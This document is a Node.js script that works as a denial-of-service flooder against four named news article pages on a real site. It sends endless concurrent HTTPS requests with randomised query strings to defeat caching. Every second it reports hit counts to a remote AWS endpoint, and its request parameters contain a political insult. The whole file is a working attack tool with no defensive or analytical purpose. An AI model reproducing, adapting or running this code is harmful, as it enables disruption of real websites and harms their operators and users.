const https = require('https')
const http = require('http')

var targets = [
    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/posolstvo-ssha-udalilo-s-sayta-dokumenty-o-biolaboratoriyah-na-ukraine'},
    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/kadyrov-vylozhil-video-s-chechenskim-flagom-na-ukraine'},
    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/rossiyskiy-pogranichnik-ranen-v-hode-provokacii-s-ukrainskoy-storony'},
    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/prezident-pridnestrovya-obratilsya-k-ukraincam-ne-verte-lzhivym-smi'}
];

const total = {};
const current = {
    error: 0
}

const getDurationInMilliseconds = (start) => {
    const NS_PER_SEC = 1e9
    const NS_TO_MS = 1e6
    const diff = process.hrtime(start)

    return (diff[0] * NS_PER_SEC + diff[1]) / NS_TO_MS
}

var CONCURRENCY_LIMIT = 100
var queue = []

setInterval(() => {
    const data = {
        ...current
    }

    Object.keys(current).forEach(key => {
        if (!total[key]) {
            total[key] = 0;
        }

        total[key] += current[key];
        current[key] = 0;
    })

    const options = {
        hostname: 'vz8hut3dbj.execute-api.eu-central-1.amazonaws.com',
        path: '/dev',
        port: 443,
        method: 'POST'
    }

    const req = https.request(options, () => {
        console.log('SENT LOG RESULTS');
    })

    req.write(JSON.stringify(data));

    req.end()
}, 1000)

async function fetchWithTimeout(resource) {
    return new Promise((resolve) => {
        const start = process.hrtime()

        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), 5000);

        const options = {
            hostname: resource.hostname,
            path:`${resource.path}?putin=huilo&biba=${Math.random()}`,
            port: 443,
            method: 'GET',
            signal: controller.signal
        }

        const result = { path: `${options.hostname}${options.path}` };

        const req = https.request(options, res => {
            result.statusCode = res.statusCode;
            result.cacheStatus = res.headers['x-cache-status'];
            clearTimeout(id);
            result.durationInMilliseconds = getDurationInMilliseconds (start)

            if (!current[res.statusCode]) {
                current[res.statusCode] = 0;
            }

            current[res.statusCode] += 1;

            resolve(result);
        })

        req.on('error', error => {
            result.error = error.message;
            clearTimeout(id);
            result.durationInMilliseconds = getDurationInMilliseconds (start)

            current.error += 1;
            resolve(result);
        })

        req.end()
    })
}
//
async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        queue.push(
            fetchWithTimeout(target)
                .then((response) => {
                    console.clear();
                    console.log(total)
                    console.log(response)
                })


        )
    }
}

targets.forEach((target) => {
    flood(target)
})